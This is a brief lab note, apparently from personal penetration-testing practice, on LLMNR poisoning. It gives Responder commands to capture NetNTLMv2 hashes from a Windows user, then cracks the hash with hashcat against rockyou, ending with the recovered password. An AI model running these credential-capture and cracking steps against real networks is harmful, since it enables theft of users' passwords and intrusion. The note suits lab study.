# LMNR Poisoning
*responder -I eth0 -rdwv does not work on newer versions, instead it is responder -I eth0 -dwv*
### 1. Set up responder
**sudo responder -I eth0 -dwv**
*we are now listening for traffic*
### 2. Go to one of the windows machines - I logged on as fcastle and point it at your attacker machine
*this will not resolve but should let us pull down the hash*

### 3. Use hashcat on the hash
	1. nano hash.txt 
		- paste your hash into this file
	2. hashcat --identify nano hash.txt
	3. crack the hash 
	4. hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt.gz --force
Explanation:
-m 5600 → NetNTLMv2
-a 0 → dictionary attack
--force → needed sometimes in VM environments

*Attack Complete: Password1!*
